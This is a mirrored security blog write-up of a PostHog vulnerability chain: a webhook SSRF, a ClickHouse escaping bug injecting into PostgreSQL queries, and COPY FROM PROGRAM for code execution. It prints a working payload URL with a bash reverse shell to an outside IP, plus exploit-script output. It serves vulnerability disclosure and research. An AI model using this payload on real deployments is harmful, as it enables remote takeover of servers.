<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://mdisec.com/inside-posthog-how-ssrf-a-clickhouse-sql-escaping-0day-and-default-postgresql-credentials-formed-an-rce-chain-zdi-25-099-zdi-25-097-zdi-25-096/">Original</a>
    <h1>Inside PostHog: SSRF, ClickHouse SQL Escape and Default Postgres Creds to RCE</h1>
    
    <div id="readability-page-1" class="page"><article>
<p>It was yet another day at the office. Our team was internally discussing moving to a different platform analytics solution. Our team was really leaning more towards Posthog. It‚Äôs one of the brilliant <em>-I personally believe it‚Äôs the best-</em> products on the market. And that‚Äôs where the story has begun‚Ä¶</p>



<span id="more-880"></span>



<p>We have a somewhat unconventional‚Äîsome might say <em>non-scalable</em>‚Äîapproach to vendor selection. Before we seriously consider adopting a product, we give ourselves a strict 24-hour ‚Äúresearch window.‚Äù Not a marketing review. Not a feature comparison spreadsheet. A hands-on, source-level, deep dive into how the product actually behaves once it‚Äôs running in our environment.</p>



<p>Earlier this year, the process was no different.</p>



<p>PostHog came up as a strong candidate. It was open source, widely adopted, and promised exactly what we were looking for: self-hosted product analytics with a modern architecture and a fast time-to-value. Spinning it up was trivial. With a single command and a few containers, we had a fully functional instance running locally within minutes.</p>



<h2>Act 1 ‚Äì Installation and Understanding the High-Level Architecture</h2>



<p>Installation was relatively trivial. I just followed the <a href="https://posthog.com/docs/self-host">https://posthog.com/docs/self-host</a> documentation and did some tweaks. Understanding the architecture at a high level was always a good starting point for developing attack scenarios later. I mean, literally a few weeks later, your brain will remember these tiny bits of information when you stumble upon a problem and desperately try to find a solution! Therefore, please always spend more time on Act-1 on your own research projects.</p>



<p>The following diagram shows an over-simplified version of the PostHog architecture. But it‚Äôs enough to understand what‚Äôs going on behind the scenes</p>



<figure data-wp-context="{&#34;imageId&#34;:&#34;6943c8dbd0708&#34;}" data-wp-interactive="core/image" data-wp-key="6943c8dbd0708"><img decoding="async" width="1024" height="304" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://mdisec.com/wp-content/uploads/2025/12/async-migrations-architecture-e1765559534618-1024x304.png" alt="" srcset="https://mdisec.com/wp-content/uploads/2025/12/async-migrations-architecture-e1765559534618-1024x304.png 1024w, https://mdisec.com/wp-content/uploads/2025/12/async-migrations-architecture-e1765559534618-300x89.png 300w, https://mdisec.com/wp-content/uploads/2025/12/async-migrations-architecture-e1765559534618-768x228.png 768w, https://mdisec.com/wp-content/uploads/2025/12/async-migrations-architecture-e1765559534618.png 1346w" sizes="(max-width: 1024px) 100vw, 1024px"/></figure>



<p>Before ending this section, I would like to add this. There are workers and plug-in services written with the Rust language, which are not shown in the above diagram. Imagine that this ‚ÄúCelery‚Äù box is actually divided into different workers and plug-ins. This will be important later.</p>



<h2>Act 2 ‚Äì Multiple Server-Side Request Forgery</h2>



<p>PostHog officially supports <strong>thousands of external integrations</strong>, allowing teams to pull data from CRMs, support platforms, billing systems, and internal tools. The promise is compelling:</p>



<blockquote>
<p><em>Analyze product and customer data in PostHog ‚Äì no matter where it was generated.</em></p>
</blockquote>



<p>From a product perspective, this makes perfect sense. From a security perspective, it is all about SSRF. Therefore I immidiately started to looking for SSRF vulnerabilities by reading source code for main application, as well as workers and plug-ins and I ended-up finding following SSRF vulnerabilities.</p>



<p><mark>CVE-2024-9710 | PostHog Rust Webhook Handler Server-Side Request Forgery Information Disclosure Vulnerability</mark></p>



<p><mark>CVE-2025-1522 | PostHog database_schema Server-Side Request Forgery Information Disclosure Vulnerability</mark></p>



<p><mark>CVE-2025-1521 | PostHog slack_incoming_webhook Server-Side Request Forgery Information Disclosure Vulnerability</mark></p>



<p>I will just focus on only one case in this write-up. At the end of the day it won‚Äôt matter which SSRF is gonna be used for the RCE chain.</p>



<h2>‚ÄúBypass‚Äù of <code>CVE-2023-46746</code> | Analysis of <mark>PostHog Rust Webhook Handler Server-Side Request</mark> Forgery</h2>



<p>You can configure Posthog to send HTTP POST requests to the URL based on the defined actions.More information about webhook can be found at <a href="https://posthog.com/docs/webhooks">https://posthog.com/docs/webhooks</a> :</p>



<p>The following screenshot shows how to add a webhook endpoint to the project. When you try to add localhost, it is going to be rejected.</p>



<figure data-wp-context="{&#34;imageId&#34;:&#34;6943c8dbd0d61&#34;}" data-wp-interactive="core/image" data-wp-key="6943c8dbd0d61"><img decoding="async" width="842" height="435" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://mdisec.com/wp-content/uploads/2025/12/posthog-webhook.jpg" alt="" srcset="https://mdisec.com/wp-content/uploads/2025/12/posthog-webhook.jpg 842w, https://mdisec.com/wp-content/uploads/2025/12/posthog-webhook-300x155.jpg 300w, https://mdisec.com/wp-content/uploads/2025/12/posthog-webhook-768x397.jpg 768w" sizes="(max-width: 842px) 100vw, 842px"/></figure>



<p>The Following request is being send to the <code>test_slack_webhook</code> endpoint. As you can see in the response, localhost is not allowed to be added as a webhook endpoint.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>POST /api/user/test_slack_webhook/ HTTP/2</span></span>
<span><span>Host: us.posthog.com</span></span>
<span><span>Accept-Encoding: gzip, deflate, br</span></span>
<span><span>Priority: u=1, i</span></span>
<span></span>
<span><span>{</span></span>
<span><span>  &#34;webhook&#34;: &#34;http://localhost/&#34;</span></span>
<span><span>}</span></span></code></pre></div>



<p>I received <code>{&#34;error&#34;:&#34;invalid webhook URL&#34;}</code> which is an error I was expecting. A quick search on the code base has shown where the validation takes place.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>@require_http_methods</span><span>([</span><span>&#34;POST&#34;</span><span>])</span></span>
<span><span>@authenticate_secondarily</span></span>
<span><span>def</span><span> </span><span>test_slack_webhook</span><span>(request):</span></span>
<span><span>    </span><span>&#34;&#34;&#34;Test webhook.&#34;&#34;&#34;</span></span>
<span><span>    </span><span>try</span><span>:</span></span>
<span><span>        body </span><span>=</span><span> json.loads(request.body)</span></span>
<span><span>    </span><span>except</span><span> (</span><span>TypeError</span><span>, json.decoder.JSONDecodeError):</span></span>
<span><span>        </span><span>return</span><span> JsonResponse({</span><span>&#34;error&#34;</span><span>: </span><span>&#34;Cannot parse request body&#34;</span><span>}, </span><span>status</span><span>=</span><span>400</span><span>)</span></span>
<span></span>
<span><span>    webhook </span><span>=</span><span> body.get(</span><span>&#34;webhook&#34;</span><span>)</span></span>
<span></span>
<span><span>    </span><span>if</span><span> </span><span>not</span><span> webhook:</span></span>
<span><span>        </span><span>return</span><span> JsonResponse({</span><span>&#34;error&#34;</span><span>: </span><span>&#34;no webhook URL&#34;</span><span>})</span></span>
<span><span>    message </span><span>=</span><span> {</span><span>&#34;text&#34;</span><span>: </span><span>&#34;_Greetings_ from PostHog!&#34;</span><span>}</span></span>
<span><span>    </span><span>try</span><span>:</span></span>
<span><span>        session </span><span>=</span><span> requests.Session()</span></span>
<span></span>
<span><span>        </span><span>if</span><span> </span><span>not</span><span> settings.</span><span>DEBUG</span><span>:</span></span>
<span><span>            raise_if_user_provided_url_unsafe(webhook)</span></span>
<span><span>            session.mount(</span><span>&#34;https://&#34;</span><span>, PublicIPOnlyHttpAdapter())</span></span>
<span><span>            session.mount(</span><span>&#34;http://&#34;</span><span>, PublicIPOnlyHttpAdapter())</span></span>
<span></span>
<span><span>        response </span><span>=</span><span> session.post(webhook, </span><span>verify</span><span>=</span><span>False</span><span>, </span><span>json</span><span>=</span><span>message)</span></span>
<span></span>
<span><span>        </span><span>if</span><span> response.ok:</span></span>
<span><span>            </span><span>return</span><span> JsonResponse({</span><span>&#34;success&#34;</span><span>: </span><span>True</span><span>})</span></span>
<span><span>        </span><span>else</span><span>:</span></span>
<span><span>            </span><span>return</span><span> JsonResponse({</span><span>&#34;error&#34;</span><span>: response.text})</span></span>
<span><span>    </span><span>except</span><span>:</span></span>
<span><span>        </span><span>return</span><span> JsonResponse({</span><span>&#34;error&#34;</span><span>: </span><span>&#34;invalid webhook URL&#34;</span><span>})</span></span></code></pre></div>



<p>Detailed analysis of this <code>test_slack_webhook </code> has shown that actually <code>CVE-2023-46746</code> was found by Github Security CodeQL team and fixed by the vendor.</p>



<p><a href="https://securitylab.github.com/advisories/GHSL-2023-185_posthog_posthog">https://securitylab.github.com/advisories/GHSL-2023-185_posthog_posthog</a></p>



<p><a href="https://github.com/PostHog/posthog/security/advisories/GHSA-wqqw-r8c5-j67c">https://github.com/PostHog/posthog/security/advisories/GHSA-wqqw-r8c5-j67c</a></p>



<p>The SSRF validation on this code flow is actually pretty good and solid. But this endpoint just performs validation on the URL. The question is:</p>



<ul>
<li>Which endpoint actually saves the URL ?</li>



<li>When/where is this endpoint used during a webhook call?</li>
</ul>



<p><em>(BONUS: If you go ahead and read the raise_if_user_provided_url_unsafe function, you will see that validation can be bypassed with simple TOCTOU approach. Give it a try on your local if you havent heard TOCTOU vulnerabilities &lt;3</em>)</p>



<p>To answer these questions, I started with a valid domain name.</p>



<p>When the frontend receives a <code>success: true</code> response from the <code>test_slack_webhook</code> endpoint, it assumes the URL is safe and proceeds to save the configuration. However, while the test endpoint applied SSRF validations, the save endpoint did not enforce the same checks.</p>



<p>By bypassing the frontend and sending a direct <code>PATCH</code> request to the project API, it was possible to store a webhook URL pointing to <code>localhost</code> or other internal addresses. This created a persistent SSRF primitive, as the webhook worker would later issue server-side requests to these internal destinations. </p>



<h2>Triggering the Action: Rust Webhook Worker</h2>



<p>To trigger the webhook delivery, I created a new action under <strong>Data Management ‚Üí Actions ‚Üí New Action</strong>, selecting <strong>‚ÄúFrom event or pageview.‚Äù</strong> Using a simple regex that matches all events ensured the action would fire for virtually any browser activity.</p>



<figure data-wp-context="{&#34;imageId&#34;:&#34;6943c8dbd1414&#34;}" data-wp-interactive="core/image" data-wp-key="6943c8dbd1414"><img loading="lazy" decoding="async" width="951" height="509" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://mdisec.com/wp-content/uploads/2025/12/posthog-action.jpg" alt="" srcset="https://mdisec.com/wp-content/uploads/2025/12/posthog-action.jpg 951w, https://mdisec.com/wp-content/uploads/2025/12/posthog-action-300x161.jpg 300w, https://mdisec.com/wp-content/uploads/2025/12/posthog-action-768x411.jpg 768w" sizes="auto, (max-width: 951px) 100vw, 951px"/></figure>



<p>Once the action was saved, no further setup was required. Any incoming event matching the regex would automatically trigger the Rust-based webhook worker, which then issued a server-side request to the webhook URL configured earlier. </p>



<p>Now you can either use your own browser to send event data or, you can use <code>posthog-python</code> SDK. Following simple requests will send an event to PostHog, which will trigger all the steps I‚Äôve mentioned above.</p>



<figure data-wp-context="{&#34;imageId&#34;:&#34;6943c8dbd1823&#34;}" data-wp-interactive="core/image" data-wp-key="6943c8dbd1823"><img loading="lazy" decoding="async" width="792" height="126" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://mdisec.com/wp-content/uploads/2025/12/posthog-python.jpg" alt="" srcset="https://mdisec.com/wp-content/uploads/2025/12/posthog-python.jpg 792w, https://mdisec.com/wp-content/uploads/2025/12/posthog-python-300x48.jpg 300w, https://mdisec.com/wp-content/uploads/2025/12/posthog-python-768x122.jpg 768w" sizes="auto, (max-width: 792px) 100vw, 792px"/></figure>



<p>We all know it‚Äôs quite important to know what type of SSRF we have in terms of exploitation capabilities. At this point, I dived into how to trigger the SSRF and better understand our lovely SSRF primitive.</p>



<h2>Rust Webhook Worker ‚Äì Understading our SSRF  Primitive </h2>



<p><code>send_webhook</code> method from <code>rust/hook-worker/src/worker.rs</code> is the one who is sending these outgoing HTTP webhook requests.When a Rust worker processes the job, it sends a request to the configured webhook URL <strong><mark>without re-validating the destination</mark></strong>. As a result, any previously saved internal URL is trusted and used directly, introducing an SSRF condition.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>async</span><span> </span><span>fn</span><span> </span><span>send_webhook</span><span>(</span></span>
<span><span>    client</span><span>:</span><span> </span><span>reqwest</span><span>::</span><span>Client</span><span>,</span></span>
<span><span>    method</span><span>:</span><span> </span><span>&amp;</span><span>HttpMethod</span><span>,</span></span>
<span><span>    url</span><span>:</span><span> </span><span>&amp;</span><span>str</span><span>,</span></span>
<span><span>    headers</span><span>:</span><span> </span><span>&amp;</span><span>collections</span><span>::</span><span>HashMap</span><span>&lt;</span><span>String</span><span>, </span><span>String</span><span>&gt;,</span></span>
<span><span>    body</span><span>:</span><span> </span><span>String</span><span>,</span></span>
<span><span>) </span><span>-&gt;</span><span> </span><span>Result</span><span>&lt;reqwest</span><span>::</span><span>Response</span><span>, </span><span>WebhookError</span><span>&gt; {</span></span>
<span><span>    </span><span>let</span><span> method</span><span>:</span><span> </span><span>http</span><span>::</span><span>Method</span><span> </span><span>=</span><span> method</span><span>.</span><span>into</span><span>();</span></span>
<span><span>    </span><span>let</span><span> url</span><span>:</span><span> </span><span>reqwest</span><span>::</span><span>Url</span><span> </span><span>=</span><span> (url)</span><span>.</span><span>parse</span><span>()</span><span>.</span><span>map_err</span><span>(</span><span>WebhookParseError</span><span>::</span><span>ParseUrlError</span><span>)</span><span>?</span><span>;</span></span>
<span><span>    </span><span>let</span><span> headers</span><span>:</span><span> </span><span>reqwest</span><span>::</span><span>header</span><span>::</span><span>HeaderMap</span><span> </span><span>=</span><span> (headers)</span></span>
<span><span>        </span><span>.</span><span>try_into</span><span>()</span></span>
<span><span>        </span><span>.</span><span>map_err</span><span>(</span><span>WebhookParseError</span><span>::</span><span>ParseHeadersError</span><span>)</span><span>?</span><span>;</span></span>
<span><span>    </span><span>let</span><span> body </span><span>=</span><span> </span><span>reqwest</span><span>::</span><span>Body</span><span>::</span><span>from</span><span>(body);</span></span>
<span></span>
<span><span>    </span><span>let</span><span> response </span><span>=</span><span> client</span></span>
<span><span>        </span><span>.</span><span>request</span><span>(method, url)</span></span>
<span><span>        </span><span>.</span><span>headers</span><span>(headers)</span></span>
<span><span>        </span><span>.</span><span>body</span><span>(body)</span></span>
<span><span>        </span><span>.</span><span>send</span><span>()</span></span>
<span><span>        </span><span>.await</span></span>
<span><span>        </span><span>.</span><span>map_err</span><span>(</span><span>|</span><span>e</span><span>|</span><span> {</span></span>
<span><span>            </span><span>if</span><span> </span><span>is_error_source</span><span>::</span><span>&lt;</span><span>NoPublicIPv4Error</span><span>&gt;(</span><span>&amp;</span><span>e) {</span></span>
<span><span>                </span><span>WebhookRequestError</span><span>::</span><span>NonRetryableRetryableRequestError</span><span> {</span></span>
<span><span>                    error</span><span>:</span><span> e,</span></span>
<span><span>                    status</span><span>:</span><span> </span><span>None</span><span>,</span></span>
<span><span>                    response</span><span>:</span><span> </span><span>None</span><span>,</span></span>
<span><span>                }</span></span>
<span><span>            } </span><span>else</span><span> {</span></span>
<span><span>                </span><span>WebhookRequestError</span><span>::</span><span>RetryableRequestError</span><span> {</span></span>
<span><span>                    error</span><span>:</span><span> e,</span></span>
<span><span>                    status</span><span>:</span><span> </span><span>None</span><span>,</span></span>
<span><span>                    response</span><span>:</span><span> </span><span>None</span><span>,</span></span>
<span><span>                    retry_after</span><span>:</span><span> </span><span>None</span><span>,</span></span>
<span><span>                }</span></span>
<span><span>            }</span></span>
<span><span>        })</span><span>?</span><span>;</span></span></code></pre></div>



<p>Additionally, the worker follows HTTP redirects. This allows an incoming <code>POST</code> request to be redirected into a <code>GET</code> request targeting an internal HTTP service by responding with a <code>302</code> redirect to the desired internal endpoint. This is the most important information I needed to know. Later down the road, you will see that we actually need an HTTP GET request for our RCE chain.</p>



<h2>Act 3 ‚Äì Clickhouse SQL injection in postgresql and sqlite table functions 0-day</h2>



<p>PostHog is explicit about its architecture: <strong><em>‚ÄúClickHouse is our main analytics backend‚Äù</em></strong>. Every event, every action, and every query ultimately flows through ClickHouse.</p>



<p>Once a reliable SSRF primitive existed, this made ClickHouse the most natural internal service to target. By default, ClickHouse exposes an <code>HTTP API</code> on <code>TCP port <strong>8123</strong></code>. This interface is enabled out of the box and, in common self-hosted deployments, does not require authentication or API tokens. The API allows queries to be issued directly over HTTP.</p>



<p>By design, <strong>HTTP <code>GET</code> requests to the query endpoint are treated as read-only</strong>. Any operation that modifies data is expected to be performed via an HTTP <code>POST</code> request with a specific request body. This distinction initially suggests a strong safety boundary.</p>



<h2>Clickhouse Table Functions</h2>



<p>One of the interesting features of the Clickhouse is called Table Functions, which can be used in the <code>FROM</code> clause of a <code>SELECT</code> statement. These functions create temporary, query-scoped tables that exist only for the duration of the query.</p>



<p>One such function is <code>postgresql()</code>, which allows ClickHouse to read from‚Äîor write to‚Äîa remote PostgreSQL database. Let‚Äôs say we have the following table in PostgreSQL:</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>postgres</span><span>=</span><span># </span><span>CREATE</span><span> </span><span>TABLE</span><span> </span><span>&#34;public&#34;</span><span>.</span><span>&#34;test&#34;</span><span> (</span></span>
<span><span>&#34;int_id&#34;</span><span> </span><span>SERIAL</span><span>,</span></span>
<span><span>&#34;int_nullable&#34;</span><span> </span><span>INT</span><span> </span><span>NULL</span><span> </span><span>DEFAULT</span><span> </span><span>NULL</span><span>,</span></span>
<span><span>&#34;float&#34;</span><span> </span><span>FLOAT</span><span> </span><span>NOT</span><span> </span><span>NULL</span><span>,</span></span>
<span><span>&#34;str&#34;</span><span> </span><span>VARCHAR</span><span>(</span><span>100</span><span>) </span><span>NOT</span><span> </span><span>NULL</span><span> </span><span>DEFAULT</span><span> </span><span>&#39;&#39;</span><span>,</span></span>
<span><span>&#34;float_nullable&#34;</span><span> </span><span>FLOAT</span><span> </span><span>NULL</span><span> </span><span>DEFAULT</span><span> </span><span>NULL</span><span>,</span></span>
<span><span>PRIMARY</span><span> </span><span>KEY</span><span> (int_id));</span></span>
<span></span>
<span><span>CREATE</span><span> </span><span>TABLE</span></span>
<span></span>
<span><span>postgres</span><span>=</span><span># </span><span>INSERT</span><span> </span><span>INTO</span><span> test (int_id, </span><span>str</span><span>, </span><span>&#34;float&#34;</span><span>) </span><span>VALUES</span><span> (</span><span>1</span><span>,</span><span>&#39;test&#39;</span><span>,</span><span>2</span><span>);</span></span>
<span><span>INSERT</span><span> </span><span>0</span><span> </span><span>1</span></span>
<span></span>
<span><span>postgresql&gt; </span><span>SELECT</span><span> </span><span>*</span><span> </span><span>FROM</span><span> test;</span></span>
<span><span>  int_id </span><span>|</span><span> int_nullable </span><span>|</span><span> float </span><span>|</span><span> </span><span>str</span><span>  </span><span>|</span><span> float_nullable</span></span>
<span><span> </span><span>--------+--------------+-------+------+----------------</span></span>
<span><span>       </span><span>1</span><span> </span><span>|</span><span>              </span><span>|</span><span>     </span><span>2</span><span> </span><span>|</span><span> test </span><span>|</span></span>
<span><span>(</span><span>1</span><span> row)</span></span></code></pre></div>



<p>We can reach this postgresql server and fetch the data from the test table by using Clickhouse Table function as follows:</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>http</span><span>:</span><span>//</span><span>clickhouse:</span><span>8123</span><span>/</span><span>?query</span><span>=SELECT</span><span> </span><span>*</span><span> </span><span>FROM</span><span> (</span><span>&#39;db:5432&#39;</span><span>,</span><span>&#39;posthog&#39;</span><span>, </span><span>&#39;posthog_table&#39;</span><span>,</span><span>&#39;posthog&#39;</span><span>,</span><span>&#39;posthog&#39;</span><span>)</span></span></code></pre></div>



<p>When I was reading the documentation, conceptually, the flow looks safe:</p>



<ul>
<li>ClickHouse parses the query (above one taken from user via HTTP API)</li>



<li>It validates the inputs</li>



<li>It generates its own internal PostgreSQL query</li>



<li>That query is executed remotely, typically via a <code>COPY (SELECT ‚Ä¶) TO STDOUT</code> statement</li>
</ul>



<p>But at the same time, more questions are raised on my mind. How do they actually make sure that transaction is READ only ? Because that‚Äôs what they say in their documentation. All the GET requests to the Clickhouse API can do operation with a READ ONLY mode. Second question was more important: </p>



<blockquote>
<p>How does the user-controlled input provided in a ClickHouse query end up escaping sanitization and being injected when ClickHouse internally builds the PostgreSQL query executed on the remote PostgreSQL database?</p>
</blockquote>



<p>Here is the internally built PostgreSQL query to be executed on the remote db.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>COPY</span><span> (</span><span>SELECT</span><span> attname </span><span>AS</span><span> </span><span>name</span><span>, </span><span>format_type</span><span>(atttypid, atttypmod) </span><span>AS</span><span> </span><span>type</span><span>, attnotnull </span><span>AS</span><span> not_null, attndims </span><span>AS</span><span> dims, atttypid </span><span>as</span><span> type_id, atttypmod </span><span>as</span><span> type_modifier, attgenerated </span><span>as</span><span> </span><span>generated</span><span> </span><span>FROM</span><span> pg_attribute </span><span>WHERE</span><span> attrelid </span><span>=</span><span> (</span><span>SELECT</span><span> </span><span>oid</span><span> </span><span>FROM</span><span> pg_class </span><span>WHERE</span><span> relname </span><span>=</span><span> </span><span>&#39;posthog_table&#39;</span><span> </span><span>AND</span><span> relnamespace </span><span>=</span><span> (</span><span>SELECT</span><span> </span><span>oid</span><span> </span><span>FROM</span><span> pg_namespace </span><span>WHERE</span><span> nspname </span><span>=</span><span> </span><span>&#39;public&#39;</span><span>)) </span><span>AND</span><span> </span><span>NOT</span><span> attisdropped </span><span>AND</span><span> attnum </span><span>&gt;</span><span> </span><span>0</span><span> </span><span>ORDER BY</span><span> attnum </span><span>ASC</span><span>) </span><span>TO</span><span> STDOUT</span></span></code></pre></div>



<h2>Wrong PostgreSQL escaping leading to Remote PostgreSQL Injection Vulnerability</h2>



<p>Escaping is tricky stuff. Especially the PostgreSQL universe; it can even get more complicated.</p>



<figure><div>
<blockquote data-width="500" data-dnt="true"><p lang="en" dir="ltr">If you want to escape the single quote in the Postgresql universe, you escape a single quote with another single quote. </p>‚Äî Mehmet INCE (@mdisec) <a href="https://twitter.com/mdisec/status/1865052466548535535?ref_src=twsrc%5Etfw">December 6, 2024</a></blockquote>
</div></figure>



<p>When I‚Äôve seen the table name that I‚Äôve provided is used on the final PostgreSQL query, I started to thinking about, <em>‚ÄúWhat if they made a mistake on the escaping here and I can actually inject my own query into the final Postgresql query??</em>?‚Äù</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>http://clickhouse:8123/?query=SELECT * FROM (&#39;db:5432&#39;,&#39;posthog&#39;, &#39;posthog_table\&#39;&#39;,&#39;posthog&#39;,&#39;posthog&#39;)</span></span></code></pre></div>



<p>I have added one single quote to the end of the username. Hit the ENTER and looked for the Postgresql console to see incoming query. And BOOM! They actually try to escape single quote with a back-slash, which is just a string for Postgresql universe. </p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>COPY</span><span> (</span><span>SELECT</span><span> attname </span><span>AS</span><span> </span><span>name</span><span>, </span><span>format_type</span><span>(atttypid, atttypmod) </span><span>AS</span><span> </span><span>type</span><span>, attnotnull </span><span>AS</span><span> not_null, attndims </span><span>AS</span><span> dims, atttypid </span><span>as</span><span> type_id, atttypmod </span><span>as</span><span> type_modifier, attgenerated </span><span>as</span><span> </span><span>generated</span><span> </span><span>FROM</span><span> pg_attribute </span><span>WHERE</span><span> attrelid </span><span>=</span><span> (</span><span>SELECT</span><span> </span><span>oid</span><span> </span><span>FROM</span><span> pg_class </span><span>WHERE</span><span> relname </span><span>=</span><span> </span><span>&#39;posthog_user\&#39;&#39; AND relnamespace = (SELECT oid FROM pg_namespace WHERE nspname = &#39;</span><span>public</span><span>&#39;)) AND NOT attisdropped AND attnum &gt; 0 ORDER BY attnum ASC) TO STDOU</span></span></code></pre></div>



<p>That small bug on the Clickhouse actually doesn‚Äôt expose a seriouse vulnerability for Clickhouse itself. But in this context, it can actually help us to achieve a RCE.</p>



<h2>Escalating SQL Injection to the Remote Code Execution</h2>



<p>As it described on Clickhouse documentation, their API is designed to be READ ONLY on any operation for HTTP GET As described in the Clickhouse documentation, their API is designed to be READ ONLY on any operation for HTTP GET requests. But we can literally inject our own query into the postgresql table function, which allows us to execute any query on the database we want!¬† But we must do a few more tricks to actually execute any query we want.</p>



<p>This time let‚Äôs have a look at my final payload first and then break it down. Sending the following query is enough to have a reverse shell from the PostgreSQL instance.</p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>http</span><span>:</span><span>//</span><span>clickhouse:</span><span>8123</span><span>/</span><span>?query</span><span>=SELECT+*+FROM+</span><span>postgresql(</span><span>&#39;db:5432&#39;</span><span>,</span><span>&#39;posthog&#39;</span><span>,\</span><span>&#34;posthog_use&#39;))+TO+STDOUT;END;DROP+TABLE+IF+EXISTS+cmd_exec;CREATE+TABLE+cmd_exec(cmd_output+text);COPY+cmd_exec+FROM+PROGRAM+$$bash+-c+\\\&#34;</span><span>bash</span><span>+-</span><span>i</span><span>+&gt;</span><span>%</span><span>26</span><span>+/</span><span>dev</span><span>/tcp/</span><span>172</span><span>.</span><span>31</span><span>.</span><span>221</span><span>.</span><span>180</span><span>/</span><span>4444</span><span>+</span><span>0</span><span>&gt;</span><span>%</span><span>261</span><span>\\\</span><span>&#34;$$;SELECT+*+FROM+cmd_exec;+--\&#34;</span><span>,</span><span>&#39;posthog&#39;</span><span>,</span><span>&#39;posthog&#39;</span><span>)#</span></span></code></pre></div>



<p>Here is the how does it work:</p>



<ul>
<li>We first escape from the COPY operation by using <code>posthog_use&#39;</code> and close it with <a href="https://mdisec.com/clickhouse/?query=SELECT+*+FROM+postgresql(&#39;db:5432&#39;,&#39;posthog&#39;,%5C%22posthog_use&#39;)"><code><strong>&#39;)</strong></code></a><strong><code>)+TO+STDOUT</code></strong></li>



<li>We reached out to the Clickhouse HTTP API with GET request, thus our COPY operation actually have READ ONLY transaction on PostgreSQL, thus we need to call <strong><code>;END;</code></strong> Otherwise we can NOT execute our own query üôÇ</li>



<li>And then by using PostgreSQL‚Äôs FROM PROGRAM feature, we can easily run any operating system command we want.</li>
</ul>



<p>The most important trick here is actually usage of <code>$$</code> instead of <code>single quotes</code> within the payload section. These dollar signs (<code>$$</code>) are used for¬†<a href="https://www.postgresql.org/docs/current/sql-syntax-lexical.html#SQL-SYNTAX-DOLLAR-QUOTING"><strong>dollar quoting</strong></a>. It can be used to replace single quotes enclosing string literals (constants) anywhere in SQL scripts. If I have used <code>single quotes</code> again for our own query, it would have been ‚Äúescaped‚Äù by Clickhouse by using black-slash, which will cause a syntax error on the PostgreSQL side!</p>



<h2>Act 4 ‚Äì Chaining them all together<br/></h2>



<p>Each issue on its own appeared low to moderate impact. But once you chained them together, we have the following attack chain:</p>



<p>1 ‚Äì Forgotten webhook URL validation on save method.</p>



<p>Here is the diagram version of the attack chain.</p>



<figure data-wp-context="{&#34;imageId&#34;:&#34;6943c8dbd23a7&#34;}" data-wp-interactive="core/image" data-wp-key="6943c8dbd23a7"><img loading="lazy" decoding="async" width="870" height="617" data-wp-class--hide="state.isContentHidden" data-wp-class--show="state.isContentVisible" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://mdisec.com/wp-content/uploads/2025/12/posthog-exploit-chain-full.png" alt="" srcset="https://mdisec.com/wp-content/uploads/2025/12/posthog-exploit-chain-full.png 870w, https://mdisec.com/wp-content/uploads/2025/12/posthog-exploit-chain-full-300x213.png 300w, https://mdisec.com/wp-content/uploads/2025/12/posthog-exploit-chain-full-768x545.png 768w" sizes="auto, (max-width: 870px) 100vw, 870px"/></figure>



<p>And the exploit in action. </p>



<div data-code-block-pro-font-family="Code-Pro-JetBrains-Mono"><pre tabindex="0"><code><span><span>‚ûú posthog-exploits git:(master) ‚úó python rust-webhook-ssrf-rce.py</span></span>
<span></span>
<span><span>Attempting to authenticate with the provided credentials...</span></span>
<span><span>Successfully authenticated!</span></span>
<span><span>Session cookie: requestsCookieJar(Cookie sessionid=uyt9sbzsoldce8ihhiatxo2u12kf72fn for localhost.local/&gt;, Cookie posthog_csrf_token=CvTA8TkB95UAOvAGkldSD8FsnEo for localhost.local/&gt;)</span></span>
<span><span>Attempting to get the default project id...</span></span>
<span><span>Default project id: 1</span></span>
<span><span>Default project name: Default project</span></span>
<span><span>Default project API Token: phc_GrjBdVEYFyzRkF0vBcGi0I21V20H9pkqtwPSj93tjE</span></span>
<span><span>Attempting to save the webhook URL payload...</span></span>
<span><span>Successfully saved the webhook URL payload!</span></span>
<span><span>Attempting to get all actions...</span></span>
<span><span>Deleting action 26...</span></span>
<span><span>Successfully deleted action 26! 586oubw77v9i</span></span>
<span><span>Attempting to create a pageview action...</span></span>
<span><span>Successfully created a pageview action!</span></span>
